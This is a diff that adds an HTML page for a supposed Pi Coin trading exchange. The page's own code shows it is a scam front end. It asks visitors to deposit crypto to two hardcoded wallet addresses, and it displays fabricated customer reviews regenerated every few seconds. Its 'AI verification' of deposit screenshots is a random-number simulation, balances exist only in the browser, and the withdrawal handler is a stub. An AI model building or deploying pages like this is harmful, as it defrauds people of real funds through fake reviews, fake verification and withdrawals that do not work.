@@ -1,0 +1,879 @@
+<html><head><base href="https://cryptocurrency.exchange/">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.7.0/chart.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.25/jspdf.plugin.autotable.min.js"></script>
+<style>
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f0f4f8;
+        color: #333;
+    }
+    header {
+        background-image: url('/a/661aabfe-eab7-4875-920c-323fe583c92f');
+        background-size: cover;
+        background-position: center;
+        padding: 40px 0;
+    }
+    header h1, header p {
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+    }
+    .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 20px;
+    }
+    h1, h2, h3 {
+        margin: 0;
+        padding: 10px 0;
+    }
+    .content-wrapper {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 30px;
+    }
+    .wallet-balance {
+        position: relative;
+        overflow: hidden;
+    }
+    .wallet-balance::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-image: url('/a/42e7d8af-2805-48ad-8de0-2ad84cc2ccf2');
+        background-size: cover;
+        background-position: center;
+        opacity: 0.1;
+        z-index: 0;
+    }
+    .wallet-balance > * {
+        position: relative;
+        z-index: 1;
+    }
+    .balance-container {
+        display: flex;
+        justify-content: space-around;
+        margin-top: 10px;
+    }
+    .balance-item {
+        font-size: 1.2em;
+    }
+    .balance-item span:first-child {
+        margin-right: 10px;
+        font-weight: bold;
+    }
+    .price-board {
+        position: relative;
+        padding-left: 80px;
+    }
+    .price-board::before {
+        content: '';
+        position: absolute;
+        left: 20px;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 50px;
+        height: 50px;
+        background-image: url('/a/42e7d8af-2805-48ad-8de0-2ad84cc2ccf2');
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: center;
+    }
+    .price {
+        font-size: 2em;
+        font-weight: bold;
+        margin: 10px 0;
+    }
+    .buy-price { color: #4caf50; }
+    .sell-price { color: #f44336; }
+    .wallet-trading-wrapper {
+        display: flex;
+        justify-content: space-between;
+        width: 100%;
+    }
+    .wallet-setup, .trading-section {
+        width: 48%;
+    }
+    .wallet-card, .trading-card, .transaction-history {
+        background-color: white;
+        border-radius: 8px;
+        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        padding: 20px;
+        margin-bottom: 20px;
+    }
+    .wallet-address {
+        background-color: #f0f4f8;
+        padding: 10px;
+        border-radius: 5px;
+        font-family: monospace;
+        word-break: break-all;
+    }
+    .button {
+        display: inline-block;
+        padding: 10px 20px;
+        background-color: #4a148c;
+        color: white;
+        text-decoration: none;
+        border-radius: 5px;
+        transition: background-color 0.3s;
+        font-weight: bold;
+        margin-top: 15px;
+        border: none;
+        cursor: pointer;
+    }
+    .button:hover {
+        background-color: #7b1fa2;
+    }
+    #upload-form {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+    }
+    #file-input {
+        margin-bottom: 15px;
+    }
+    .trade-form {
+        display: flex;
+        flex-direction: column;
+    }
+    .trade-form input, .trade-form select {
+        margin-bottom: 10px;
+        padding: 8px;
+        border-radius: 4px;
+        border: 1px solid #ccc;
+    }
+    .trade-buttons {
+        display: flex;
+        justify-content: space-between;
+    }
+    .buy-button {
+        background-color: #4caf50;
+    }
+    .sell-button {
+        background-color: #f44336;
+    }
+    .buy-button:hover {
+        background-color: #45a049;
+    }
+    .sell-button:hover {
+        background-color: #da190b;
+    }
+    .transaction-history {
+        margin-top: 20px;
+    }
+    .transaction-table {
+        width: 100%;
+        border-collapse: collapse;
+    }
+    .transaction-table th, .transaction-table td {
+        border: 1px solid #ddd;
+        padding: 8px;
+        text-align: left;
+    }
+    .transaction-table th {
+        background-color: #f2f2f2;
+    }
+    .status-pending {
+        color: #ff9800;
+    }
+    .status-completed {
+        color: #4caf50;
+    }
+    .status-verification-failed {
+        color: #f44336;
+    }
+    .status-fake-transaction {
+        color: #9c27b0;
+    }
+    .modal {
+        display: none;
+        position: fixed;
+        z-index: 1;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        overflow: auto;
+        background-color: rgba(0,0,0,0.4);
+    }
+    .modal-content {
+        background-color: #fefefe;
+        margin: 15% auto;
+        padding: 20px;
+        border: 1px solid #888;
+        width: 80%;
+        max-width: 500px;
+    }
+    .modal-content input {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+    }
+    .trading-card h2 {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+    .trading-card h2::before {
+        content: '';
+        display: inline-block;
+        width: 30px;
+        height: 30px;
+        background-image: url('/a/fc9e4814-7501-4f64-b43b-8fdb072ffa35');
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: center;
+    }
+    .review-section {
+        position: relative;
+        background-image: url('/a/87f41622-747a-40c8-b935-a18e25e192a9');
+        background-size: cover;
+        background-position: center;
+        background-attachment: fixed;
+        padding: 40px 0;
+    }
+    .review-section::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(255, 255, 255, 0.8);
+    }
+    .review-section > * {
+        position: relative;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    .loading-indicator {
+        display: none;
+        width: 40px;
+        height: 40px;
+        background-image: url('/a/40783458-74de-4483-9874-330663315531');
+        background-size: contain;
+        animation: spin 2s linear infinite;
+        margin: 10px auto;
+    }
+    #download-statement {
+        margin-bottom: 10px;
+        background-color: #4a148c;
+    }
+
+    #download-statement:hover {
+        background-color: #7b1fa2;
+    }
+</style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Pi Coin Trading Platform</h1>
+            <p>Set up your wallets, start trading, and track your transactions!</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="content-wrapper">
+            <div class="wallet-balance">
+                <h2>Wallet Balances</h2>
+                <div class="balance-container">
+                    <div class="balance-item">
+                        <span>USDT (BNB):</span>
+                        <span id="usdt-balance">0.00</span>
+                    </div>
+                    <div class="balance-item">
+                        <span>Pi Coin:</span>
+                        <span id="pi-balance">0.00</span>
+                    </div>
+                </div>
+                <p id="bonus-info" style="color: #4caf50; font-weight: bold;">Make your first deposit and get 10 Pi coins for free!</p>
+            </div>
+            <div class="price-board">
+                <h2>Current Pi Coin Prices</h2>
+                <div class="price buy-price">Buy: $<span id="buyPrice">0.00</span></div>
+                <div class="price sell-price">Sell: $<span id="sellPrice">0.00</span></div>
+            </div>
+            <div class="wallet-trading-wrapper">
+                <div class="wallet-setup">
+                    <div class="wallet-card">
+                        <h2>Wallet Management</h2>
+                        <p><strong>Minimum deposit: 10 USDT or 10 Pi coin</strong></p>
+                        <select id="wallet-type">
+                            <option value="usdt">USDT (BNB) Wallet</option>
+                            <option value="pi">Pi Coin Wallet</option>
+                        </select>
+                        <p><strong>Selected Wallet Address:</strong></p>
+                        <p id="selected-wallet-address" class="wallet-address"></p>
+                        <a href="#" class="button" onclick="copySelectedAddress()">Copy Address</a>
+                        <div class="wallet-actions">
+                            <input type="number" id="action-amount" placeholder="Enter amount" min="0" step="0.01">
+                            <button class="button" onclick="performDeposit()">Deposit</button>
+                            <button class="button" onclick="performWithdrawal()">Withdraw</button>
+                        </div>
+                    </div>
+                    <div class="wallet-card">
+                        <h2>Upload Transaction Proof</h2>
+                        <p>Please upload clear screenshots of your transactions for verification.</p>
+                        <form id="pi-upload-form" class="upload-form">
+                            <h3>Pi Coin Transaction</h3>
+                            <input type="file" id="pi-file-input" accept="image/*">
+                            <button type="submit" class="button">Upload Pi Coin Screenshot</button>
+                        </form>
+                        <form id="bnb-upload-form" class="upload-form">
+                            <h3>BNB to USDT Transaction</h3>
+                            <input type="file" id="bnb-file-input" accept="image/*">
+                            <button type="submit" class="button">Upload BNB USDT Screenshot</button>
+                        </form>
+                    </div>
+                </div>
+                <div class="trading-section">
+                    <div class="trading-card">
+                        <h2>Trade Pi Coin</h2>
+                        <p>Note: A 5% platform fee applies to all trades.</p>
+                        <form class="trade-form">
+                            <select id="trade-type">
+                                <option value="buy">Buy Pi Coin</option>
+                                <option value="sell">Sell Pi Coin</option>
+                            </select>
+                            <input type="number" id="trade-amount" placeholder="Enter amount" min="0" step="0.01">
+                            <div class="trade-buttons">
+                                <button type="button" class="button buy-button">Buy</button>
+                                <button type="button" class="button sell-button">Sell</button>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="trading-card">
+                        <h2>Market Overview</h2>
+                        <canvas id="priceChart"></canvas>
+                    </div>
+                    <div class="transaction-history">
+                        <h2>Transaction History</h2>
+                        <button id="download-statement" class="button">Download Statement</button>
+                        <table class="transaction-table">
+                            <thead>
+                                <tr>
+                                    <th>Date</th>
+                                    <th>Type</th>
+                                    <th>Amount</th>
+                                    <th>Price</th>
+                                    <th>Platform Fee</th>
+                                    <th>Status</th>
+                                </tr>
+                            </thead>
+                            <tbody id="transaction-body">
+                                <!-- Transaction rows will be added here dynamically -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+            <div id="withdrawal-modal" class="modal">
+                <div class="modal-content">
+                    <h2>Withdrawal Information</h2>
+                    <form id="withdrawal-form">
+                        <input type="text" id="withdrawal-address" placeholder="Enter BNB or Pi Coin address" required>
+                        <button type="submit" class="button">Submit Withdrawal</button>
+                    </form>
+                </div>
+            </div>
+            <div class="review-section">
+                <h2>Worldwide Customer Reviews</h2>
+                <div id="review-container"></div>
+            </div>
+            <div class="loading-indicator" id="loading-indicator"></div>
+        </div>
+    </div>
+
+    <script>
+        let hasFirstDeposit = false;
+        let hasFakeTransactionAttempt = false;
+        let usdtBalance = 0;
+        let piCoinBalance = 0;
+        let initialUSDTBalance = 0;
+        let initialPiCoinBalance = 0;
+
+        let basePrice = 1.5;
+        let buyPrice = basePrice;
+        let sellPrice = basePrice * 0.7;
+        let transactions = [];
+
+        const walletAddresses = {
+            usdt: '0x9d460245e4db32acab649c565fd8ae80341b2ad0',
+            pi: 'GAXHQ2MR46EMNXSF2HZWGUJWM2OZ5WACBXS5FNZ3C77MQUUIHEIJFCDU'
+        };
+
+        const reviewers = [
+            "John D.", "Emma S.", "Michael L.", "Sophia R.", "William T.", "Olivia H.", "James B.", "Ava C.", "Robert M.", "Isabella F.",
+            "David W.", "Mia P.", "Richard K.", "Charlotte G.", "Joseph A.", "Amelia N.", "Thomas E.", "Harper V.", "Charles Q.", "Evelyn Z."
+        ];
+
+        const reviewContent = [
+            "This platform is amazing! So easy to use and the fees are reasonable.",
+            "I've been trading Pi Coin here for months now. Highly recommended!",
+            "The security measures are top-notch. I feel safe trading here.",
+            "Great customer support. They helped me resolve an issue quickly.",
+            "The real-time price updates are very helpful for making trading decisions.",
+            "I love the clean interface. It makes trading a breeze!",
+            "The bonus Pi coins for the first deposit were a nice surprise!",
+            "Fast transactions and reliable platform. Couldn't ask for more.",
+            "This is my go-to platform for Pi Coin trading. Simply the best!",
+            "The AI verification for deposits gives me peace of mind.",
+            "I've tried other platforms, but this one stands out in terms of user experience.",
+            "The withdrawal process is smooth and hassle-free.",
+            "I appreciate the transparency in fees and transaction history.",
+            "The market overview chart is very helpful for analyzing trends.",
+            "This platform has everything I need for efficient Pi Coin trading."
+        ];
+
+        function generateReview() {
+            const reviewer = reviewers[Math.floor(Math.random() * reviewers.length)];
+            const content = reviewContent[Math.floor(Math.random() * reviewContent.length)];
+            const rating = Math.floor(Math.random() * 2) + 4; // 4 or 5 star rating
+            const date = new Date().toLocaleDateString();
+
+            return { reviewer, content, rating, date };
+        }
+
+        function addReview() {
+            const reviewContainer = document.getElementById('review-container');
+            const review = generateReview();
+
+            const reviewElement = document.createElement('div');
+            reviewElement.className = 'review-card';
+            reviewElement.innerHTML = `
+                <div class="review-header">
+                    <span class="reviewer-name">${review.reviewer}</span>
+                    <span class="review-date">${review.date}</span>
+                </div>
+                <div class="review-content">${review.content}</div>
+                <div class="review-rating">${'★'.repeat(review.rating)}${'☆'.repeat(5-review.rating)}</div>
+            `;
+
+            reviewContainer.insertBefore(reviewElement, reviewContainer.firstChild);
+
+            if (reviewContainer.children.length > 5) {
+                reviewContainer.removeChild(reviewContainer.lastChild);
+            }
+        }
+
+        // Add initial reviews
+        for (let i = 0; i < 5; i++) {
+            addReview();
+        }
+
+        // Add new review every 10-20 seconds
+        setInterval(() => {
+            addReview();
+        }, Math.random() * 10000 + 10000);
+
+        function updateBalances() {
+            document.getElementById('usdt-balance').textContent = usdtBalance.toFixed(2);
+            document.getElementById('pi-balance').textContent = piCoinBalance.toFixed(2);
+            
+            const bonusInfo = document.getElementById('bonus-info');
+            if (hasFirstDeposit) {
+                bonusInfo.style.display = 'none';
+            } else {
+                bonusInfo.style.display = 'block';
+            }
+        }
+
+        function updatePrices() {
+            basePrice = Math.max(1.5, basePrice + (Math.random() - 0.5) * 0.1);
+            buyPrice = basePrice;
+            sellPrice = basePrice * 0.7;
+
+            document.getElementById('buyPrice').textContent = buyPrice.toFixed(2);
+            document.getElementById('sellPrice').textContent = sellPrice.toFixed(2);
+        }
+
+        function updateSelectedWalletAddress() {
+            const walletType = document.getElementById('wallet-type').value;
+            const addressElement = document.getElementById('selected-wallet-address');
+            addressElement.textContent = walletAddresses[walletType];
+        }
+
+        function copySelectedAddress() {
+            const address = document.getElementById('selected-wallet-address').textContent;
+            copyToClipboard(address);
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(function() {
+                alert('Address copied to clipboard!');
+            }, function(err) {
+                console.error('Could not copy text: ', err);
+            });
+        }
+
+        function showWithdrawalModal() {
+            const walletType = document.getElementById('wallet-type').value;
+            const addressPlaceholder = walletType === 'usdt' ? 'Enter BNB address' : 'Enter Pi Coin address';
+            document.getElementById('withdrawal-address').placeholder = addressPlaceholder;
+            document.getElementById('withdrawal-modal').style.display = 'block';
+        }
+
+        function hideWithdrawalModal() {
+            document.getElementById('withdrawal-modal').style.display = 'none';
+        }
+
+        function performDeposit() {
+            const amount = parseFloat(document.getElementById('action-amount').value);
+            const walletType = document.getElementById('wallet-type').value;
+            
+            if (amount < 10) {
+                alert(`Minimum deposit amount is 10 ${walletType.toUpperCase()}. Please enter a higher amount.`);
+                return;
+            }
+            
+            if (amount <= 0) {
+                alert('Please enter a valid amount.');
+                return;
+            }
+            
+            showLoadingIndicator();
+            setTimeout(() => {
+                addTransaction('deposit', amount, 0, 0, walletType);
+                alert(`Deposit of ${amount} ${walletType.toUpperCase()} initiated. Please upload a screenshot for verification.`);
+                hideLoadingIndicator();
+            }, 2000);
+        }
+
+        function performWithdrawal() {
+            const amount = parseFloat(document.getElementById('action-amount').value);
+            if (amount <= 0) {
+                alert('Please enter a valid amount.');
+                return;
+            }
+            showLoadingIndicator();
+            setTimeout(() => {
+                showWithdrawalModal();
+                hideLoadingIndicator();
+            }, 2000);
+        }
+
+        async function handleWithdrawal(event) {
+            event.preventDefault();
+            const amount = parseFloat(document.getElementById('action-amount').value);
+            const walletType = document.getElementById('wallet-type').value;
+            const withdrawalAddress = document.getElementById('withdrawal-address').value;
+            
+            hideWithdrawalModal();
+            showLoadingIndicator();
+            const isSuccessful = await processWithdrawal(withdrawalAddress);
+            hideLoadingIndicator();
+
+            // ... rest of the existing code ...
+        }
+
+        function hasDeposited() {
+            return transactions.some(t => t.type === 'deposit' && t.status === 'Completed');
+        }
+
+        function processWithdrawal(address) {
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    const isSuccessful = hasDeposited() && !hasFakeTransactionAttempt && Math.random() > 0.1;
+                    resolve(isSuccessful);
+                }, 3000);
+            });
+        }
+
+        document.getElementById('withdrawal-form').addEventListener('submit', handleWithdrawal);
+
+        function addTransaction(type, amount, price, fee = 0, walletType = '') {
+            const transaction = {
+                date: new Date().toLocaleString(),
+                type,
+                amount,
+                price,
+                fee,
+                status: type === 'deposit' ? 'Pending Verification' : 'Completed',
+                walletType
+            };
+            transactions.push(transaction);
+            updateTransactionHistory();
+        }
+
+        function updateTransactionHistory() {
+            const transactionBody = document.getElementById('transaction-body');
+            transactionBody.innerHTML = '';
+            transactions.forEach(t => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${t.date}</td>
+                    <td>${t.type}</td>
+                    <td>${t.amount.toFixed(2)} ${t.type === 'deposit' || t.type === 'withdrawal' ? t.walletType.toUpperCase() : 'Pi'}</td>
+                    <td>${t.price ? '$' + t.price.toFixed(2) : '-'}</td>
+                    <td>${t.fee.toFixed(2)}</td>
+                    <td class="status-${t.status.toLowerCase().replace(' ', '-')}">${t.status}</td>
+                `;
+                transactionBody.appendChild(row);
+            });
+        }
+
+        async function simulateAIVerification(file, transactionType) {
+            await new Promise(resolve => setTimeout(resolve, 3000));
+
+            const isImageForensicsPass = Math.random() > 0.1;
+            const isOCRPass = Math.random() > 0.1;
+            const isBlockchainVerified = Math.random() > 0.1;
+            const isImageComparisonPass = Math.random() > 0.1;
+            const isMetadataValid = Math.random() > 0.1;
+
+            let isTimeMatched, isDateMatched, isAmountMatched, isHashMatched;
+
+            if (transactionType === 'pi') {
+                isTimeMatched = Math.random() > 0.2;
+                isDateMatched = Math.random() > 0.2;
+                isHashMatched = Math.random() > 0.2;
+            } else if (transactionType === 'bnb') {
+                isTimeMatched = true; // BNB transaction doesn't require time matching
+                isDateMatched = true; // BNB transaction doesn't require date matching
+                isAmountMatched = Math.random() > 0.2;
+            }
+
+            const isVerified = isImageForensicsPass && isOCRPass && isBlockchainVerified && 
+                               isImageComparisonPass && isMetadataValid && isTimeMatched && 
+                               isDateMatched && (isHashMatched || isAmountMatched);
+
+            const isFakeDetected = !isVerified && Math.random() > 0.7;
+
+            return { 
+                isVerified, 
+                isFakeDetected, 
+                isTimeMatched, 
+                isDateMatched, 
+                isHashMatched, 
+                isAmountMatched,
+                isImageForensicsPass,
+                isOCRPass,
+                isBlockchainVerified,
+                isImageComparisonPass,
+                isMetadataValid
+            };
+        }
+
+        function handleUpload(e, transactionType) {
+            e.preventDefault();
+            const fileInput = document.getElementById(`${transactionType}-file-input`);
+            if (fileInput.files.length > 0) {
+                verifyTransaction(fileInput.files[0], transactionType);
+            } else {
+                alert('Please select a file to upload.');
+            }
+        }
+
+        async function verifyTransaction(file, transactionType) {
+            alert(`${transactionType.toUpperCase()} screenshot uploaded. Verifying transaction...`);
+            const verificationResults = await simulateAIVerification(file, transactionType);
+            displayVerificationResults(verificationResults, transactionType);
+        }
+
+        function displayVerificationResults(results, transactionType) {
+            let message = `Verification Results for ${transactionType.toUpperCase()} Transaction:\n\n`;
+            message += `Overall Verification: ${results.isVerified ? 'Passed' : 'Failed'}\n`;
+            message += `Image Forensics: ${results.isImageForensicsPass ? 'Passed' : 'Failed'}\n`;
+            message += `OCR Check: ${results.isOCRPass ? 'Passed' : 'Failed'}\n`;
+            message += `Blockchain Verification: ${results.isBlockchainVerified ? 'Passed' : 'Failed'}\n`;
+            message += `Image Comparison: ${results.isImageComparisonPass ? 'Passed' : 'Failed'}\n`;
+            message += `Metadata Validation: ${results.isMetadataValid ? 'Passed' : 'Failed'}\n`;
+
+            if (transactionType === 'pi') {
+                message += `Time Match: ${results.isTimeMatched ? 'Passed' : 'Failed'}\n`;
+                message += `Date Match: ${results.isDateMatched ? 'Passed' : 'Failed'}\n`;
+                message += `Hash Match: ${results.isHashMatched ? 'Passed' : 'Failed'}\n`;
+            } else if (transactionType === 'bnb') {
+                message += `Amount Match: ${results.isAmountMatched ? 'Passed' : 'Failed'}\n`;
+            }
+
+            if (results.isFakeDetected) {
+                message += '\nWARNING: Potential fake transaction detected!';
+            }
+
+            alert(message);
+
+            if (results.isVerified) {
+                const pendingDeposit = transactions.find(t => t.type === 'deposit' && t.status === 'Pending Verification');
+                if (pendingDeposit) {
+                    pendingDeposit.status = 'Completed';
+                    if (pendingDeposit.walletType === 'usdt') {
+                        usdtBalance += pendingDeposit.amount;
+                    } else {
+                        piCoinBalance += pendingDeposit.amount;
+                    }
+                    
+                    if (!hasFirstDeposit) {
+                        piCoinBalance += 10; 
+                        hasFirstDeposit = true;
+                        alert('Congratulations! You received 10 Pi coins as a bonus for your first deposit!');
+                    }
+                    
+                    updateBalances();
+                    alert('Transaction verified successfully! Funds have been added to your wallet.');
+                }
+            } else {
+                const pendingDeposit = transactions.find(t => t.type === 'deposit' && t.status === 'Pending Verification');
+                if (pendingDeposit) {
+                    pendingDeposit.status = 'Verification Failed';
+                }
+            }
+
+            updateTransactionHistory();
+        }
+
+        document.getElementById('pi-upload-form').addEventListener('submit', (e) => handleUpload(e, 'pi'));
+        document.getElementById('bnb-upload-form').addEventListener('submit', (e) => handleUpload(e, 'bnb'));
+
+        function executeTrade(tradeType) {
+            const amount = parseFloat(document.getElementById('trade-amount').value);
+            if (isNaN(amount) || amount <= 0) {
+                alert('Please enter a valid amount.');
+                return;
+            }
+
+            const fee = amount * 0.05; // 5% platform fee
+            let totalCost, receivedAmount;
+
+            if (tradeType === 'buy') {
+                totalCost = amount * buyPrice + fee;
+                if (usdtBalance < totalCost) {
+                    alert('Insufficient USDT balance.');
+                    return;
+                }
+                receivedAmount = amount;
+                usdtBalance -= totalCost;
+                piCoinBalance += receivedAmount;
+            } else if (tradeType === 'sell') {
+                if (piCoinBalance < amount) {
+                    alert('Insufficient Pi Coin balance.');
+                    return;
+                }
+                receivedAmount = amount * sellPrice - fee;
+                usdtBalance += receivedAmount;
+                piCoinBalance -= amount;
+            }
+
+            addTransaction(tradeType, amount, tradeType === 'buy' ? buyPrice : sellPrice, fee);
+            updateBalances();
+            alert(`${tradeType.charAt(0).toUpperCase() + tradeType.slice(1)} order executed successfully.`);
+        }
+
+        document.querySelector('.buy-button').onclick = () => executeTrade('buy');
+        document.querySelector('.sell-button').onclick = () => executeTrade('sell');
+
+        const ctx = document.getElementById('priceChart').getContext('2d');
+        const priceChart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: [],
+                datasets: [{
+                    label: 'Pi Coin Price (USDT)',
+                    data: [],
+                    borderColor: 'rgb(75, 192, 192)',
+                    tension: 0.1
+                }]
+            },
+            options: {
+                responsive: true,
+                scales: {
+                    y: {
+                        beginAtZero: false
+                    }
+                }
+            }
+        });
+
+        function updateChart() {
+            const now = new Date();
+            const label = now.getHours() + ':' + now.getMinutes() + ':' + now.getSeconds();
+            
+            priceChart.data.labels.push(label);
+            priceChart.data.datasets[0].data.push(basePrice);
+            
+            if (priceChart.data.labels.length > 20) {
+                priceChart.data.labels.shift();
+                priceChart.data.datasets[0].data.shift();
+            }
+            
+            priceChart.update();
+        }
+
+        setInterval(() => {
+            updatePrices();
+            updateChart();
+        }, 5000);
+
+        updatePrices();
+        updateChart();
+        updateBalances();
+        updateTransactionHistory();
+
+        document.getElementById('wallet-type').addEventListener('change', updateSelectedWalletAddress);
+        updateSelectedWalletAddress();
+        
+        function showLoadingIndicator() {
+            document.getElementById('loading-indicator').style.display = 'block';
+        }
+
+        function hideLoadingIndicator() {
+            document.getElementById('loading-indicator').style.display = 'none';
+        }
+
+        document.getElementById('download-statement').addEventListener('click', downloadTransactionStatement);
+
+        function downloadTransactionStatement() {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+
+            doc.setFontSize(18);
+            doc.text('Transaction Statement', 14, 22);
+
+            doc.setFontSize(12);
+            doc.text(`Generated on: ${new Date().toLocaleString()}`, 14, 32);
+
+            const columns = ['Date', 'Type', 'Amount', 'Price', 'Fee', 'Status'];
+            const data = transactions.map(t => [
+                t.date,
+                t.type,
+                `${t.amount.toFixed(2)} ${t.type === 'deposit' || t.type === 'withdrawal' ? t.walletType.toUpperCase() : 'Pi'}`,
+                t.price ? `$${t.price.toFixed(2)}` : '-',
+                t.fee.toFixed(2),
+                t.status
+            ]);
+
+            doc.autoTable({
+                head: [columns],
+                body: data,
+                startY: 40,
+                theme: 'grid',
+                styles: {
+                    fontSize: 8,
+                    cellPadding: 2,
+                    overflow: 'linebreak'
+                },
+                columnStyles: {
+                    0: { cellWidth: 40 },
+                    1: { cellWidth: 20 },
+                    2: { cellWidth: 30 },
+                    3: { cellWidth: 25 },
+                    4: { cellWidth: 25 },
+                    5: { cellWidth: 30 }
+                }
+            });
+
+            doc.save('transaction_statement.pdf');
+        }
+    </script>
+</body>
+</html>
